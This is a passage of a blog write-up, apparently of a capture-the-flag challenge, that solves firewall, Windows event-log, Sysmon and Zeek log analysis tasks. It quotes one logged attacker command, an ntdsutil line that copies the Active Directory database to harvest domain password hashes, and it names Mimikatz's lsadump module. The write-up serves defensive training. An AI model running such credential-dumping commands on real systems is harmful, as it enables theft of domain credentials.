interface.</li></ol><p>Tutorial: <a href=https://wiki.centos.org/HowTos/Network/IPTables target=_blank rel="noreferrer noopener">https://wiki.centos.org/HowTos/Network/IPTables</a></p><ol><li>Default policites to DROP<ul><li>sudo iptables -P INPUT DROP</li><li>sudo iptables -P OUTPUT DROP</li><li>sudo iptables -P FORWARD DROP</li></ul></li><li>Accept all connections that are established, related.<ul><li>sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li><li>sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li></ul></li><li>Accept only one IP for SSH.<ul><li>sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT</li></ul></li><li>Have to match multiport to specify multiple ports in one rule<ul><li>sudo iptables -A INPUT -p tcp --match multiport --dports 21,80 -j ACCEPT</li></ul></li><li>Accept all output traffic going to port 80.<ul><li>sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</li></ul></li><li>Accept all traffic fromthe lo interface.<ul><li>sudo iptables -A INPUT -i lo -j ACCEPT</li></ul></li></ol><h1 id=find-the-turtle-doves>Find the Turtle Doves
<a class=header-link href=#find-the-turtle-doves><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>They are in the student union area.</p><h1 id=3-windows-log-analysis-evaluate-attack-outcome>3. Windows Log Analysis: Evaluate Attack Outcome
<a class=header-link href=#3-windows-log-analysis-evaluate-attack-outcome><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>We're seeing attacks against the Elf U domain! Using the event log data,
identify the user account that the attacker compromised using a password spray
attack. Bushy Evergreen is hanging out in the train station and may be able to
help you out.</p><ul><li><a href=https://downloads.elfu.org/Security.evtx.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/Security.evtx.zip</a></li></ul><p>Bushy Evergreen says <code>DeepBlueCLI tool is useful</code>.</p><p><code>.\DeepBlue.ps1 .\Security.evtx >> report.txt</code> and it spits out the report.</p><p>The tool gives <code>Multiple admin logons for one account</code> for three accounts but
only one of them appears in the <code>Password Spray Attack</code> prompts.</p><p>Answer: <code>supatree</code></p><h1 id=4-windows-log-analysis-determine-attacker-technique>4. Windows Log Analysis: Determine Attacker Technique
<a class=header-link href=#4-windows-log-analysis-determine-attacker-technique><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Using these normalized Sysmon logs, identify the tool the attacker used to
retrieve domain password hashes from the lsass.exe process. For hints on
achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.</p><p><a href=https://downloads.elfu.org/sysmon-data.json.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/sysmon-data.json.zip</a></p><p>Mimikatz has a module named <code>lsadump</code>. Mimikatz does not appear in the logs but
the module might.</p><p><a href=https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump target=_blank rel="noreferrer noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p><p>Maybe it's <code>procdump</code>. No it's not.</p><p>Search with <code>EQL</code> at <a href=https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql</a></p><p>This query did not work.</p><ul><li><a href=https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html target=_blank rel="noreferrer noopener">https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html</a></li><li><code>file where file_name == "lsass*.dmp" and process_name != "werfault.exe"</code></li></ul><p>Looking here, <a href=https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ target=_blank rel="noreferrer noopener">https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/</a></p><p>We can see some tools. Going through the tools, we get to <code>ntdsutil</code>. Searching
for it, we get to the last entry in the file which has our answer.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;command_line&#34;</span>: <span style=color:#2aa198>&#34;ntdsutil.exe  \&#34;ac i ntds\&#34; ifm \&#34;create full c:\\hive\&#34; q q&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;event_type&#34;</span>: <span style=color:#2aa198>&#34;process&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;logon_id&#34;</span>: <span style=color:#2aa198>999</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;parent_process_name&#34;</span>: <span style=color:#2aa198>&#34;cmd.exe&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;parent_process_path&#34;</span>: <span style=color:#2aa198>&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;pid&#34;</span>: <span style=color:#2aa198>3556</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;ppid&#34;</span>: <span style=color:#2aa198>3440</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;process_name&#34;</span>: <span style=color:#2aa198>&#34;ntdsutil.exe&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;process_path&#34;</span>: <span style=color:#2aa198>&#34;C:\\Windows\\System32\\ntdsutil.exe&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;subtype&#34;</span>: <span style=color:#2aa198>&#34;create&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;timestamp&#34;</span>: <span style=color:#2aa198>132186398470300000</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;unique_pid&#34;</span>: <span style=color:#2aa198>&#34;{7431d376-dee7-5dd3-0000-0010f0c44f00}&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;unique_ppid&#34;</span>: <span style=color:#2aa198>&#34;{7431d376-dedb-5dd3-0000-001027be4f00}&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;user&#34;</span>: <span style=color:#2aa198>&#34;NT AUTHORITY\\SYSTEM&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;user_domain&#34;</span>: <span style=color:#2aa198>&#34;NT AUTHORITY&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;user_name&#34;</span>: <span style=color:#2aa198>&#34;SYSTEM&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Answer: <code>ntdsutil</code></p><h1 id=5-network-log-analysis-determine-compromised-system>5. Network Log Analysis: Determine Compromised System
<a class=header-link href=#5-network-log-analysis-determine-compromised-system><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these Zeek logs? For hints on achieving this
objective, please visit the Laboratory and talk with Sparkle Redberry.</p><ul><li><a href=https://downloads.elfu.org/elfu-zeeklogs.zip target=_blank rel="noreferrer noopener">https://downloads.elfu.org/elfu-zeeklogs.zip</a></li></ul><p>Hint from Sparkle:</p><pre tabindex=0><code>You got it - three cheers for cheer!
For objective 5, have you taken a look at our Zeek logs?
Something&#39;s gone wrong. But I hear someone named Rita can help us.
Can you and she figure out what happened?
</code></pre><p>Rita is a framework for network traffic analysis and can ingest Zeek logs.</p><ul><li><a href=https://github.com/activecm/rita target=_blank rel="noreferrer noopener">https://github.com/activecm/rita</a></li></ul><p>Seems like we might not have needed to install rita because the logs have the
html report.</p><p>Following the video here, HTML report is discussed at:</p><ul><li><a href="https://youtu.be/JoWzkcEotA8?t=350" target=_blank rel="noreferrer noopener">https://youtu.be/JoWzkcEotA8?t=350</a></li></ul><p>Open the <code>ELFU/index.html</code> file and click on <code>Beacons</code>. Then we will see one
node (<code>192.168.134.130</code>) with almost a perfect score (<code>0.998</code>). Has a lot of
connections (<code>7660</code>) and goes to a weird IP address (<code>144.202.46.214</code>).</p><pre tabindex=0><code>Score	Source	Destination	Connections	Avg. Bytes	Intvl. Range	Size Range	Intvl. Mode	Size Mode	Intvl. Mode Count	Size Mode Count	Intvl. Skew	Size Skew	Intvl. Dispersion	Size Dispersion
0.998	192.168.134.130	144.202.46.214	7660	1156.000	10	683	10	563	6926	7641	0.000	0.000	0	0
</code></pre><p>There's nothing in Blacklists (<code>BL Source IPs</code> <code>BL Dest. IPs</code> and <code>BL Hostnames</code>).</p><p>This was our answer <code>192.168.134.130</code>.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span><time>Jan 15, 2020</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2019-12-22-using-mozilla-rhino-to-run-javascript-in-java/ title="Using Mozilla Rhino to Run JavaScript in Java">Using Mozilla Rhino to Run JavaScript in Java</a>
<a class="basic-alignment right" href=https://parsiya.net/blog/2020-02-06-documentation-writing-for-system-administrators-notes/ title="Documentation Writing for System Administrators - Notes">Documentation Writing for System Administrators - Notes</a></p></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, a security engineer at Microsoft.</p><p>I write about application security, cryptography, static analysis, and
(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more. Contact me via any of these ways.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/static-analysis/ title="Static Analysis">Static Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2025 Parsia - <a href=https://parsiya.net/license/>License</a> -
<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>